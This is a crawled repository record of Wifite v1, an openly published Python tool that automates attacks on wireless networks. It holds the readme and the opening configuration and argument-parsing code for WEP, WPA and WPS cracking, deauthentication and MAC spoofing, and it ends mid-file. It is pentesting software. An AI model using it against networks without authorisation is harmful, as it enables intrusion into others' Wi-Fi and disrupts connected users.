{
  "metadata": {
    "timestamp": 1736560378668,
    "page": 920,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjkzMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "derv82/wifite",
      "stars": 3288,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.0234375,
          "content": "cracked.csv\n*.cap\n*.swp\n"
        },
        {
          "name": "readme.md",
          "type": "blob",
          "size": 3.05078125,
          "content": "THIS PROJECT IS IN LIFE-SUPPORT MODE\n------------------------------------\n\nThis repo tracks the old version of Wifite (*v1*) which does not receive frequent updates and has many bugs (check out the *Isuses* tab!).\n\nThere's a new version of Wifite (*Wifite2*) available at [https://github.com/derv82/wifite2](https://github.com/derv82/wifite2). *Wifite2* has more features, bug fixes, and reliability.\n\n*Try the new Wifite2, especially if you're having problems with Wifite v1*\n\n\nAbout\n-----\n\n_Wifite is for Linux only._\n\nWifite is an automated wireless attack tool.\n\nWifite was designed for use with pentesting distributions of Linux, such as [Kali Linux](http://www.kali.org/), [Pentoo](http://www.pentoo.ch/), [BackBox](http://www.backbox.org); any Linux distributions with wireless drivers patched for injection. The script appears to also operate with Ubuntu 11/10, Debian 6, and Fedora 16.\n\nWifite must be run as __root__. This is required by the suite of programs it uses. Running downloaded scripts as root is a bad idea. I recommend using the Kali Linux bootable Live CD, a bootable USB stick (for persistent), or a virtual machine. Note that Virtual Machines cannot directly access hardware so a wireless USB dongle would be required.\n\nWifite assumes that you have a wireless card and the appropriate drivers that are patched for injection and promiscuous/monitor mode.\n\n\nExecution\n---------\n\nTo download and execute wifite, run the commands below:\n\n`wget https://raw.github.com/derv82/wifite/master/wifite.py`  \n`chmod +x wifite.py`  \n`./wifite.py`  \n\n\nRequired Programs\n-----------------\n\nPlease see [the installation guide](https://github.com/derv82/wifite/wiki/Installation) on the wiki for help installing any of the tools below.\n\n* [__Python 2.7.x__](http://python.org/getit/). Wifite is a Python script and requires Python to run.\n\n* [__aircrack-ng suite__](http://aircrack-ng.org/).\n  This is absolutely required.  The specific programs used in the suite are: \n    * airmon-ng, \n    * airodump-ng, \n    * aireplay-ng, \n    * packetforge-ng, and\n    * aircrack-ng.\n\n* Standard linux programs.\n  * iwconfig, ifconfig, which, iw\n\nSuggested Programs\n------------------\n\n_`*` indicates program is not included in [Backtrack 5 R1](http://www.backtrack-linux.org/)_\n\n* `*`[__reaver__](https://github.com/t6x/reaver-wps-fork-t6x), a Wifi-Protected Setup (WPS) attack tool.  Reaver includes a scanner \"walsh\" (or \"wash\") for detecting WPS-enabled access points. Wifite uses Reaver to scan for and attack WPS-enabled routers.\n\n* `*`[__pyrit__](https://github.com/JPaulMora/Pyrit), a GPU cracker for WPA PSK keys. Wifite uses pyrit (if found) to detect handshakes. In the future, Wifite may include an option to crack WPA handshakes via pyrit.\n\n* __tshark__. Comes bundled with [Wireshark](http://www.wireshark.org/), packet sniffing software.\n\n* [__cowpatty__](http://www.willhackforsushi.com/Cowpatty.html), a WPA PSK key cracker. Wifite uses cowpatty (if found) to detect handshakes.\n\n\nLicensing\n---------\n\nWifite is licensed under the GNU General Public License version 2 (GNU GPL v2).\n\n(C) 2010-2012 Derv Merkler\n"
        },
        {
          "name": "wifite.py",
          "type": "blob",
          "size": 154.279296875,
          "content": "#!/usr/bin/python\n\n# -*- coding: utf-8 -*-\n\n\"\"\"\n    wifite\n\n    author: derv82 at gmail\n    author: bwall @botnet_hunter (ballastsec@gmail.com)\n    author: drone @dronesec (ballastsec@gmail.com)\n\n    Thanks to everyone that contributed to this project.\n    If you helped in the past and want your name here, shoot me an email\n\n    Licensed under the GNU General Public License Version 2 (GNU GPL v2),\n        available at: http://www.gnu.org/licenses/gpl-2.0.txt\n\n    (C) 2011 Derv Merkler\n\n    Ballast Security additions\n    -----------------\n     - No longer requires to be root to run -cracked\n     - cracked.txt changed to cracked.csv and stored in csv format(easier to read, no \\x00s)\n         - Backwards compatibility\n     - Made a run configuration class to handle globals\n     - Added -recrack (shows already cracked APs in the possible targets, otherwise hides them)\n     - Changed the updater to grab files from GitHub and not Google Code\n     - Use argparse to parse command-line arguments\n     - -wepca flag now properly initialized if passed through CLI\n     - parse_csv uses python csv library\n    -----------------\n\n\n    TODO:\n\n    Restore same command-line switch names from v1\n\n    If device already in monitor mode, check for and, if applicable, use macchanger\n\n     WPS\n     * Mention reaver automatically resumes sessions\n     * Warning about length of time required for WPS attack (*hours*)\n     * Show time since last successful attempt\n     * Percentage of tries/attempts ?\n     * Update code to work with reaver 1.4 (\"x\" sec/att)\n\n     WEP:\n     * ability to pause/skip/continue    (done, not tested)\n     * Option to capture only IVS packets (uses --output-format ivs,csv)\n       - not compatible on older aircrack-ng's.\n           - Just run \"airodump-ng --output-format ivs,csv\", \"No interface specified\" = works\n         - would cut down on size of saved .caps\n\n     reaver:\n          MONITOR ACTIVITY!\n          - Enter ESSID when executing (?)\n       - Ensure WPS key attempts have begun.\n       - If no attempts can be made, stop attack\n\n       - During attack, if no attempts are made within X minutes, stop attack & Print\n\n       - Reaver's output when unable to associate:\n         [!] WARNING: Failed to associate with AA:BB:CC:DD:EE:FF (ESSID: ABCDEF)\n       - If failed to associate for x minutes, stop attack (same as no attempts?)\n\n    MIGHTDO:\n      * WPA - crack (pyrit/cowpatty) (not really important)\n      * Test injection at startup? (skippable via command-line switch)\n\n\"\"\"\n\n# ############\n# LIBRARIES #\n#############\n\nimport csv  # Exporting and importing cracked aps\nimport os  # File management\nimport time  # Measuring attack intervals\nimport random  # Generating a random MAC address.\nimport errno  # Error numbers\n\nfrom sys import argv  # Command-line arguments\nfrom sys import stdout  # Flushing\n\nfrom shutil import copy  # Copying .cap files\n\n# Executing, communicating with, killing processes\nfrom subprocess import Popen, call, PIPE\nfrom signal import SIGINT, SIGTERM\n\nimport re  # RegEx, Converting SSID to filename\nimport argparse  # arg parsing\nimport urllib  # Check for new versions from the repo\nimport abc  # abstract base class libraries for attack templates\n\n\n################################\n# GLOBAL VARIABLES IN ALL CAPS #\n################################\n\n# Console colors\nW = '\\033[0m'  # white (normal)\nR = '\\033[31m'  # red\nG = '\\033[32m'  # green\nO = '\\033[33m'  # orange\nB = '\\033[34m'  # blue\nP = '\\033[35m'  # purple\nC = '\\033[36m'  # cyan\nGR = '\\033[37m'  # gray\n\n# /dev/null, send output from programs so they don't print to screen.\nDN = open(os.devnull, 'w')\nERRLOG = open(os.devnull, 'w')\nOUTLOG = open(os.devnull, 'w')\n\n###################\n# DATA STRUCTURES #\n###################\n\n\nclass CapFile:\n    \"\"\"\n        Holds data about an access point's .cap file, including AP's ESSID & BSSID.\n    \"\"\"\n\n    def __init__(self, filename, ssid, bssid):\n        self.filename = filename\n        self.ssid = ssid\n        self.bssid = bssid\n\n\nclass Target:\n    \"\"\"\n        Holds data for a Target (aka Access Point aka Router)\n    \"\"\"\n\n    def __init__(self, bssid, power, data, channel, encryption, ssid):\n        self.bssid = bssid\n        self.power = power\n        self.data = data\n        self.channel = channel\n        self.encryption = encryption\n        self.ssid = ssid\n        self.wps = False  # Default to non-WPS-enabled router.\n        self.key = ''\n\n\nclass Client:\n    \"\"\"\n        Holds data for a Client (device connected to Access Point/Router)\n    \"\"\"\n\n    def __init__(self, bssid, station, power):\n        self.bssid = bssid\n        self.station = station\n        self.power = power\n\n\nclass RunConfiguration:\n    \"\"\"\n        Configuration for this rounds of attacks\n    \"\"\"\n\n    def __init__(self):\n        self.REVISION = 89;\n        self.PRINTED_SCANNING = False\n\n        self.TX_POWER = 0  # Transmit power for wireless interface, 0 uses default power\n\n        # WPA variables\n        self.WPA_DISABLE = False  # Flag to skip WPA handshake capture\n        self.WPA_STRIP_HANDSHAKE = True  # Use pyrit or tshark (if applicable) to strip handshake\n        self.WPA_DEAUTH_COUNT = 1  # Count to send deauthentication packets\n        self.WPA_DEAUTH_TIMEOUT = 10  # Time to wait between deauthentication bursts (in seconds)\n        self.WPA_ATTACK_TIMEOUT = 500  # Total time to allow for a handshake attack (in seconds)\n        self.WPA_HANDSHAKE_DIR = 'hs'  # Directory in which handshakes .cap files are stored\n        # Strip file path separator if needed\n        if self.WPA_HANDSHAKE_DIR != '' and self.WPA_HANDSHAKE_DIR[-1] == os.sep:\n            self.WPA_HANDSHAKE_DIR = self.WPA_HANDSHAKE_DIR[:-1]\n\n        self.WPA_FINDINGS = []  # List of strings containing info on successful WPA attacks\n        self.WPA_DONT_CRACK = False  # Flag to skip cracking of handshakes\n        if os.path.exists('/usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'):\n            self.WPA_DICTIONARY = '/usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'\n        elif os.path.exists('/usr/share/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'):\n            self.WPA_DICTIONARY = '/usr/share/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'\n        elif os.path.exists('/usr/share/wordlists/fern-wifi/common.txt'):\n            self.WPA_DICTIONARY = '/usr/share/wordlists/fern-wifi/common.txt'\n        else:\n            self.WPA_DICTIONARY = ''\n\n        # Various programs to use when checking for a four-way handshake.\n        # True means the program must find a valid handshake in order for wifite to recognize a handshake.\n        # Not finding handshake short circuits result (ALL 'True' programs must find handshake)\n        self.WPA_HANDSHAKE_TSHARK = True  # Checks for sequential 1,2,3 EAPOL msg packets (ignores 4th)\n        self.WPA_HANDSHAKE_PYRIT = False  # Sometimes crashes on incomplete dumps, but accurate.\n        self.WPA_HANDSHAKE_AIRCRACK = True  # Not 100% accurate, but fast.\n        self.WPA_HANDSHAKE_COWPATTY = False  # Uses more lenient \"nonstrict mode\" (-2)\n\n        # WEP variables\n        self.WEP_DISABLE = False  # Flag for ignoring WEP networks\n        self.WEP_PPS = 600  # packets per second (Tx rate)\n        self.WEP_TIMEOUT = 600  # Amount of time to give each attack\n        self.WEP_ARP_REPLAY = True  # Various WEP-based attacks via aireplay-ng\n        self.WEP_CHOPCHOP = True  #\n        self.WEP_FRAGMENT = True  #\n        self.WEP_CAFFELATTE = True  #\n        self.WEP_P0841 = True\n        self.WEP_HIRTE = True\n        self.WEP_CRACK_AT_IVS = 10000  # Number of IVS at which we start cracking\n        self.WEP_IGNORE_FAKEAUTH = True  # When True, continues attack despite fake authentication failure\n        self.WEP_FINDINGS = []  # List of strings containing info on successful WEP attacks.\n        self.WEP_SAVE = False  # Save packets.\n\n        # WPS variables\n        self.WPS_DISABLE = False  # Flag to skip WPS scan and attacks\n        self.PIXIE = False\n        self.WPS_FINDINGS = []  # List of (successful) results of WPS attacks\n        self.WPS_TIMEOUT = 660  # Time to wait (in seconds) for successful PIN attempt\n        self.WPS_RATIO_THRESHOLD = 0.01  # Lowest percentage of tries/attempts allowed (where tries > 0)\n        self.WPS_MAX_RETRIES = 0  # Number of times to re-try the same pin before giving up completely.\n\n\n        # Program variables\n        self.SHOW_ALREADY_CRACKED = False  # Says whether to show already cracked APs as options to crack\n        self.WIRELESS_IFACE = ''  # User-defined interface\n        self.MONITOR_IFACE = ''  # User-defined interface already in monitor mode\n        self.TARGET_CHANNEL = 0  # User-defined channel to scan on\n        self.TARGET_ESSID = ''  # User-defined ESSID of specific target to attack\n        self.TARGET_BSSID = ''  # User-defined BSSID of specific target to attack\n        self.IFACE_TO_TAKE_DOWN = ''  # Interface that wifite puts into monitor mode\n        # It's our job to put it out of monitor mode after the attacks\n        self.ORIGINAL_IFACE_MAC = ('', '')  # Original interface name[0] and MAC address[1] (before spoofing)\n        self.DO_NOT_CHANGE_MAC = True  # Flag for disabling MAC anonymizer\n        self.SEND_DEAUTHS = True # Flag for deauthing clients while scanning for acces points\n        self.TARGETS_REMAINING = 0  # Number of access points remaining to attack\n        self.WPA_CAPS_TO_CRACK = []  # list of .cap files to crack (full of CapFile objects)\n        self.THIS_MAC = ''  # The interfaces current MAC address.\n        self.SHOW_MAC_IN_SCAN = False  # Display MACs of the SSIDs in the list of targets\n        self.CRACKED_TARGETS = []  # List of targets we have already cracked\n        self.ATTACK_ALL_TARGETS = False  # Flag for when we want to attack *everyone*\n        self.ATTACK_MIN_POWER = 0  # Minimum power (dB) for access point to be considered a target\n        self.VERBOSE_APS = True  # Print access points as they appear\n        self.CRACKED_TARGETS = self.load_cracked()\n        old_cracked = self.load_old_cracked()\n        if len(old_cracked) > 0:\n            # Merge the results\n            for OC in old_cracked:\n                new = True\n                for NC in self.CRACKED_TARGETS:\n                    if OC.bssid == NC.bssid:\n                        new = False\n                        break\n                # If Target isn't in the other list\n                # Add and save to disk\n                if new:\n                    self.save_cracked(OC)\n\n    def ConfirmRunningAsRoot(self):\n        if os.getuid() != 0:\n            print R + ' [!]' + O + ' ERROR:' + G + ' wifite' + O + ' must be run as ' + R + 'root' + W\n            print R + ' [!]' + O + ' login as root (' + W + 'su root' + O + ') or try ' + W + 'sudo ./wifite.py' + W\n            exit(1)\n\n    def ConfirmCorrectPlatform(self):\n        if not os.uname()[0].startswith(\"Linux\") and not 'Darwin' in os.uname()[0]:  # OSX support, 'cause why not?\n            print O + ' [!]' + R + ' WARNING:' + G + ' wifite' + W + ' must be run on ' + O + 'linux' + W\n            exit(1)\n\n    def CreateTempFolder(self):\n        from tempfile import mkdtemp\n\n        self.temp = mkdtemp(prefix='wifite')\n        if not self.temp.endswith(os.sep):\n            self.temp += os.sep\n\n    def save_cracked(self, target):\n        \"\"\"\n            Saves cracked access point key and info to a file.\n        \"\"\"\n        self.CRACKED_TARGETS.append(target)\n        with open('cracked.csv', 'wb') as csvfile:\n            targetwriter = csv.writer(csvfile, delimiter=',', quotechar='\"', quoting=csv.QUOTE_MINIMAL)\n            for target in self.CRACKED_TARGETS:\n                targetwriter.writerow([target.bssid, target.encryption, target.ssid, target.key, target.wps])\n\n    def load_cracked(self):\n        \"\"\"\n            Loads info about cracked access points into list, returns list.\n        \"\"\"\n        result = []\n        if not os.path.exists('cracked.csv'): return result\n        with open('cracked.csv', 'rb') as csvfile:\n            targetreader = csv.reader(csvfile, delimiter=',', quotechar='\"')\n            for row in targetreader:\n                t = Target(row[0], 0, 0, 0, row[1], row[2])\n                t.key = row[3]\n                t.wps = row[4]\n                result.append(t)\n        return result\n\n    def load_old_cracked(self):\n        \"\"\"\n                Loads info about cracked access points into list, returns list.\n        \"\"\"\n        result = []\n        if not os.path.exists('cracked.txt'):\n            return result\n        fin = open('cracked.txt', 'r')\n        lines = fin.read().split('\\n')\n        fin.close()\n\n        for line in lines:\n            fields = line.split(chr(0))\n            if len(fields) <= 3:\n                continue\n            tar = Target(fields[0], '', '', '', fields[3], fields[1])\n            tar.key = fields[2]\n            result.append(tar)\n        return result\n\n    def exit_gracefully(self, code=0):\n        \"\"\"\n            We may exit the program at any time.\n            We want to remove the temp folder and any files contained within it.\n            Removes the temp files/folder and exists with error code \"code\".\n        \"\"\"\n        # Remove temp files and folder\n        if os.path.exists(self.temp):\n            for f in os.listdir(self.temp):\n                os.remove(os.path.join(self.temp, f))\n            os.rmdir(self.temp)\n        # Disable monitor mode if enabled by us\n        self.RUN_ENGINE.disable_monitor_mode()\n        # Change MAC address back if spoofed\n        mac_change_back()\n        print GR + \" [+]\" + W + \" quitting\"  # wifite will now exit\"\n        print ''\n        # GTFO\n        exit(code)\n\n    def handle_args(self):\n        \"\"\"\n            Handles command-line arguments, sets global variables.\n        \"\"\"\n        set_encrypt = False\n        set_hscheck = False\n        set_wep = False\n        capfile = ''  # Filename of .cap file to analyze for handshakes\n\n        opt_parser = self.build_opt_parser()\n        options = opt_parser.parse_args()\n\n        try:\n            if not set_encrypt and (options.wpa or options.wep or options.wps):\n                self.WPS_DISABLE = True\n                self.WPA_DISABLE = True\n                self.WEP_DISABLE = True\n                set_encrypt = True\n            if options.recrack:\n                self.SHOW_ALREADY_CRACKED = True\n                print GR + ' [+]' + W + ' including already cracked networks in targets.'\n            if options.wpa:\n                if options.wps:\n                    print GR + ' [+]' + W + ' targeting ' + G + 'WPA' + W + ' encrypted networks.'\n                else:\n                    print GR + ' [+]' + W + ' targeting ' + G + 'WPA' + W + ' encrypted networks (use ' + G + '-wps' + W + ' for WPS scan)'\n                self.WPA_DISABLE = False\n            if options.wep:\n                print GR + ' [+]' + W + ' targeting ' + G + 'WEP' + W + ' encrypted networks'\n                self.WEP_DISABLE = False\n            if options.wps:\n                print GR + ' [+]' + W + ' targeting ' + G + 'WPS-enabled' + W + ' networks.'\n                self.WPS_DISABLE = False\n            if options.pixie:\n                print GR + ' [+]' + W + ' targeting ' + G + 'WPS-enabled' + W + ' networks.'\n                print GR + ' [+]' + W + ' using only ' + G + 'WPS Pixie-Dust' + W + ' attack.'\n                self.WPS_DISABLE = False\n                self.WEP_DISABLE = True\n                self.PIXIE = True\n            if options.channel:\n                try:\n                    self.TARGET_CHANNEL = int(options.channel)\n                except ValueError:\n                    print O + ' [!]' + R + ' invalid channel: ' + O + options.channel + W\n                except IndexError:\n                    print O + ' [!]' + R + ' no channel given!' + W\n                else:\n                    print GR + ' [+]' + W + ' channel set to %s' % (G + str(self.TARGET_CHANNEL) + W)\n            if options.mac_anon:\n                print GR + ' [+]' + W + ' mac address anonymizing ' + G + 'enabled' + W\n                print O + '      not: only works if device is not already in monitor mode!' + W\n                self.DO_NOT_CHANGE_MAC = False\n            if options.interface:\n                self.WIRELESS_IFACE = options.interface\n                print GR + ' [+]' + W + ' set interface :%s' % (G + self.WIRELESS_IFACE + W)\n            if options.monitor_interface:\n                self.MONITOR_IFACE = options.monitor_interface\n                print GR + ' [+]' + W + ' set interface already in monitor mode :%s' % (G + self.MONITOR_IFACE + W)\n            if options.nodeauth:\n                self.SEND_DEAUTHS = False\n                print GR + ' [+]' + W + ' will not deauthenticate clients while scanning%s' % W\n            if options.essid:\n                try:\n                    self.TARGET_ESSID = options.essid\n                except ValueError:\n                    print R + ' [!]' + O + ' no ESSID given!' + W\n                else:\n                    print GR + ' [+]' + W + ' targeting ESSID \"%s\"' % (G + self.TARGET_ESSID + W)\n            if options.bssid:\n                try:\n                    self.TARGET_BSSID = options.bssid\n                except ValueError:\n                    print R + ' [!]' + O + ' no BSSID given!' + W\n                else:\n                    print GR + ' [+]' + W + ' targeting BSSID \"%s\"' % (G + self.TARGET_BSSID + W)\n            if options.showb:\n                self.SHOW_MAC_IN_SCAN = True\n                print GR + ' [+]' + W + ' target MAC address viewing ' + G + 'enabled' + W\n            if options.all:\n                self.ATTACK_ALL_TARGETS = True\n                print GR + ' [+]' + W + ' targeting ' + G + 'all access points' + W\n            if options.power:\n                try:\n                    self.ATTACK_MIN_POWER = int(options.power)\n                except ValueError:\n                    print R + ' [!]' + O + ' invalid power level: %s' % (R + options.power + W)\n                except IndexError:\n                    print R + ' [!]' + O + ' no power level given!' + W\n                else:\n                    print GR + ' [+]' + W + ' minimum target power set to %s' % (G + str(self.ATTACK_MIN_POWER) + W)\n            if options.tx:\n                try:\n                    self.TX_POWER = int(options.tx)\n                except ValueError:\n                    print R + ' [!]' + O + ' invalid TX power leve: %s' % ( R + options.tx + W)\n                except IndexError:\n                    print R + ' [!]' + O + ' no TX power level given!' + W\n                else:\n                    print GR + ' [+]' + W + ' TX power level set to %s' % (G + str(self.TX_POWER) + W)\n            if options.quiet:\n                self.VERBOSE_APS = False\n                print GR + ' [+]' + W + ' list of APs during scan ' + O + 'disabled' + W\n            if options.check:\n                try:\n                    capfile = options.check\n                except IndexError:\n                    print R + ' [!]' + O + ' unable to analyze capture file' + W\n                    print R + ' [!]' + O + ' no cap file given!\\n' + W\n                    self.exit_gracefully(1)\n                else:\n                    if not os.path.exists(capfile):\n                        print R + ' [!]' + O + ' unable to analyze capture file!' + W\n                        print R + ' [!]' + O + ' file not found: ' + R + capfile + '\\n' + W\n                        self.exit_gracefully(1)\n            if options.cracked:\n                if len(self.CRACKED_TARGETS) == 0:\n                    print R + ' [!]' + O + ' There are no cracked access points saved to ' + R + 'cracked.db\\n' + W\n                    self.exit_gracefully(1)\n                print GR + ' [+]' + W + ' ' + W + 'previously cracked access points' + W + ':'\n                for victim in self.CRACKED_TARGETS:\n                    if victim.wps != False:\n                        print '     %s (%s) : \"%s\" - Pin: %s' % (\n                        C + victim.ssid + W, C + victim.bssid + W, G + victim.key + W, G + victim.wps + W)\n                    else:\n                        print '     %s (%s) : \"%s\"' % (C + victim.ssid + W, C + victim.bssid + W, G + victim.key + W)\n                print ''\n                self.exit_gracefully(0)\n            # WPA\n            if not set_hscheck and (options.tshark or options.cowpatty or options.aircrack or options.pyrit):\n                self.WPA_HANDSHAKE_TSHARK = False\n                self.WPA_HANDSHAKE_PYRIT = False\n                self.WPA_HANDSHAKE_COWPATTY = False\n                self.WPA_HANDSHAKE_AIRCRACK = False\n                set_hscheck = True\n            if options.strip:\n                self.WPA_STRIP_HANDSHAKE = True\n                print GR + ' [+]' + W + ' handshake stripping ' + G + 'enabled' + W\n            if options.wpadt:\n                try:\n                    self.WPA_DEAUTH_TIMEOUT = int(options.wpadt)\n                except ValueError:\n                    print R + ' [!]' + O + ' invalid deauth timeout: %s' % (R + options.wpadt + W)\n                except IndexError:\n                    print R + ' [!]' + O + ' no deauth timeout given!' + W\n                else:\n                    print GR + ' [+]' + W + ' WPA deauth timeout set to %s' % (G + str(self.WPA_DEAUTH_TIMEOUT) + W)\n            if options.wpat:\n                try:\n                    self.WPA_ATTACK_TIMEOUT = int(options.wpat)\n                except ValueError:\n                    print R + ' [!]' + O + ' invalid attack timeout: %s' % (R + options.wpat + W)\n                except IndexError:\n                    print R + ' [!]' + O + ' no attack timeout given!' + W\n                else:\n                    print GR + ' [+]' + W + ' WPA attack timeout set to %s' % (G + str(self.WPA_ATTACK_TIMEOUT) + W)\n            if options.crack:\n                self.WPA_DONT_CRACK = False\n                print GR + ' [+]' + W + ' WPA cracking ' + G + 'enabled' + W\n                if options.dic:\n                    try:\n                        self.WPA_DICTIONARY = options.dic\n                    except IndexError:\n                        print R + ' [!]' + O + ' no WPA dictionary given!'\n                    else:\n                        if os.path.exists(options.dic):\n                            print GR + ' [+]' + W + ' WPA dictionary set to %s' % (G + self.WPA_DICTIONARY + W)\n                        else:\n                            print R + ' [!]' + O + ' WPA dictionary file not found: %s' % (options.dic)\n                else:\n                    print R + ' [!]' + O + ' WPA dictionary file not given!'\n                    self.exit_gracefully(1)\n            if options.tshark:\n                self.WPA_HANDSHAKE_TSHARK = True\n                print GR + ' [+]' + W + ' tshark handshake verification ' + G + 'enabled' + W\n            if options.pyrit:\n                self.WPA_HANDSHAKE_PYRIT = True\n                print GR + ' [+]' + W + ' pyrit handshake verification ' + G + 'enabled' + W\n            if options.aircrack:\n                self.WPA_HANDSHAKE_AIRCRACK = True\n                print GR + ' [+]' + W + ' aircrack handshake verification ' + G + 'enabled' + W\n            if options.cowpatty:\n                self.WPA_HANDSHAKE_COWPATTY = True\n                print GR + ' [+]' + W + ' cowpatty handshake verification ' + G + 'enabled' + W\n\n            # WEP\n            if not set_wep and options.chopchop or options.fragment or options.caffeelatte or options.arpreplay \\\n                    or options.p0841 or options.hirte:\n                self.WEP_CHOPCHOP = False\n                self.WEP_ARPREPLAY = False\n                self.WEP_CAFFELATTE = False\n                self.WEP_FRAGMENT = False\n                self.WEP_P0841 = False\n                self.WEP_HIRTE = False\n            if options.chopchop:\n                print GR + ' [+]' + W + ' WEP chop-chop attack ' + G + 'enabled' + W\n                self.WEP_CHOPCHOP = True\n            if options.fragment:\n                print GR + ' [+]' + W + ' WEP fragmentation attack ' + G + 'enabled' + W\n                self.WEP_FRAGMENT = True\n            if options.caffeelatte:\n                print GR + ' [+]' + W + ' WEP caffe-latte attack ' + G + 'enabled' + W\n                self.WEP_CAFFELATTE = True\n            if options.arpreplay:\n                print GR + ' [+]' + W + ' WEP arp-replay attack ' + G + 'enabled' + W\n                self.WEP_ARPREPLAY = True\n            if options.p0841:\n                print GR + ' [+]' + W + ' WEP p0841 attack ' + G + 'enabled' + W\n                self.WEP_P0841 = True\n            if options.hirte:\n                print GR + ' [+]' + W + ' WEP hirte attack ' + G + 'enabled' + W\n                self.WEP_HIRTE = True\n            if options.fakeauth:\n                print GR + ' [+]' + W + ' ignoring failed fake-authentication ' + R + 'disabled' + W\n                self.WEP_IGNORE_FAKEAUTH = False\n            if options.wepca:\n                try:\n                    self.WEP_CRACK_AT_IVS = int(options.wepca)\n                except ValueError:\n                    print R + ' [!]' + O + ' invalid number: %s' % ( R + options.wepca + W )\n                except IndexError:\n                    print R + ' [!]' + O + ' no IV number specified!' + W\n                else:\n                    print GR + ' [+]' + W + ' Starting WEP cracking when IV\\'s surpass %s' % (\n                    G + str(self.WEP_CRACK_AT_IVS) + W)\n            if options.wept:\n                try:\n                    self.WEP_TIMEOUT = int(options.wept)\n                except ValueError:\n                    print R + ' [!]' + O + ' invalid timeout: %s' % (R + options.wept + W)\n                except IndexError:\n                    print R + ' [!]' + O + ' no timeout given!' + W\n                else:\n                    print GR + ' [+]' + W + ' WEP attack timeout set to %s' % (\n                    G + str(self.WEP_TIMEOUT) + \" seconds\" + W)\n            if options.pps:\n                try:\n                    self.WEP_PPS = int(options.pps)\n                except ValueError:\n                    print R + ' [!]' + O + ' invalid value: %s' % (R + options.pps + W)\n                except IndexError:\n                    print R + ' [!]' + O + ' no value given!' + W\n                else:\n                    print GR + ' [+]' + W + ' packets-per-second rate set to %s' % (\n                    G + str(options.pps) + \" packets/sec\" + W)\n            if options.wepsave:\n                self.WEP_SAVE = True\n                print GR + ' [+]' + W + ' WEP .cap file saving ' + G + 'enabled' + W\n\n            # WPS\n            if options.wpst:\n                try:\n                    self.WPS_TIMEOUT = int(options.wpst)\n                except ValueError:\n                    print R + ' [!]' + O + ' invalid timeout: %s' % (R + options.wpst + W)\n                except IndexError:\n                    print R + ' [!]' + O + ' no timeout given!' + W\n                else:\n                    print GR + ' [+]' + W + ' WPS attack timeout set to %s' % (\n                    G + str(self.WPS_TIMEOUT) + \" seconds\" + W)\n            if options.wpsratio:\n                try:\n                    self.WPS_RATIO_THRESHOLD = float(options.wpsratio)\n                except ValueError:\n                    print R + ' [!]' + O + ' invalid percentage: %s' % (R + options.wpsratio + W)\n                except IndexError:\n                    print R + ' [!]' + O + ' no ratio given!' + W\n                else:\n                    print GR + ' [+]' + W + ' minimum WPS tries/attempts threshold set to %s' % (\n                    G + str(self.WPS_RATIO_THRESHOLD) + \"\" + W)\n            if options.wpsretry:\n                try:\n                    self.WPS_MAX_RETRIES = int(options.wpsretry)\n                except ValueError:\n                    print R + ' [!]' + O + ' invalid number: %s' % (R + options.wpsretry + W)\n                except IndexError:\n                    print R + ' [!]' + O + ' no number given!' + W\n                else:\n                    print GR + ' [+]' + W + ' WPS maximum retries set to %s' % (\n                    G + str(self.WPS_MAX_RETRIES) + \" retries\" + W)\n\n        except IndexError:\n            print '\\nindexerror\\n\\n'\n\n        if capfile != '':\n            self.RUN_ENGINE.analyze_capfile(capfile)\n        print ''\n\n    def build_opt_parser(self):\n        \"\"\" Options are doubled for backwards compatability; will be removed soon and\n            fully moved to GNU-style\n        \"\"\"\n        option_parser = argparse.ArgumentParser()\n\n        # set commands\n        command_group = option_parser.add_argument_group('COMMAND')\n        command_group.add_argument('--check', help='Check capfile [file] for handshakes.', action='store', dest='check')\n        command_group.add_argument('-check', action='store', dest='check', help=argparse.SUPPRESS)\n        command_group.add_argument('--cracked', help='Display previously cracked access points.', action='store_true',\n                                   dest='cracked')\n        command_group.add_argument('-cracked', help=argparse.SUPPRESS, action='store_true', dest='cracked')\n        command_group.add_argument('--recrack', help='Include already cracked networks in targets.',\n                                   action='store_true', dest='recrack')\n        command_group.add_argument('-recrack', help=argparse.SUPPRESS, action='store_true', dest='recrack')\n\n        # set global\n        global_group = option_parser.add_argument_group('GLOBAL')\n        global_group.add_argument('--all', help='Attack all targets.', default=False, action='store_true', dest='all')\n        global_group.add_argument('-all', help=argparse.SUPPRESS, default=False, action='store_true', dest='all')\n        global_group.add_argument('-i', help='Wireless interface for capturing.', action='store', dest='interface')\n        global_group.add_argument('--mac', help='Anonymize MAC address.', action='store_true', default=False,\n                                  dest='mac_anon')\n        global_group.add_argument('-mac', help=argparse.SUPPRESS, action='store_true', default=False, dest='mac_anon')\n        global_group.add_argument('--mon-iface', help='Interface already in monitor mode.', action='store',\n                                  dest='monitor_interface')\n        global_group.add_argument('-c', help='Channel to scan for targets.', action='store', dest='channel')\n        global_group.add_argument('-e', help='Target a specific access point by ssid (name).', action='store',\n                                  dest='essid')\n        global_group.add_argument('-b', help='Target a specific access point by bssid (mac).', action='store',\n                                  dest='bssid')\n        global_group.add_argument('--showb', help='Display target BSSIDs after scan.', action='store_true',\n                                  dest='showb')\n        global_group.add_argument('-showb', help=argparse.SUPPRESS, action='store_true', dest='showb')\n        global_group.add_argument('--nodeauth', help='Do not deauthenticate clients while scanning', action='store_true', dest='nodeauth')\n        global_group.add_argument('--power', help='Attacks any targets with signal strength > [pow].', action='store',\n                                  dest='power')\n        global_group.add_argument('-power', help=argparse.SUPPRESS, action='store', dest='power')\n        global_group.add_argument('--tx', help='Set adapter TX power level.', action='store', dest='tx')\n        global_group.add_argument('-tx', help=argparse.SUPPRESS, action='store', dest='tx')\n        global_group.add_argument('--quiet', help='Do not print list of APs during scan.', action='store_true',\n                                  dest='quiet')\n        global_group.add_argument('-quiet', help=argparse.SUPPRESS, action='store_true', dest='quiet')\n        # set wpa commands\n        wpa_group = option_parser.add_argument_group('WPA')\n        wpa_group.add_argument('--wpa', help='Only target WPA networks (works with --wps --wep).', default=False,\n                               action='store_true', dest='wpa')\n        wpa_group.add_argument('-wpa', help=argparse.SUPPRESS, default=False, action='store_true', dest='wpa')\n        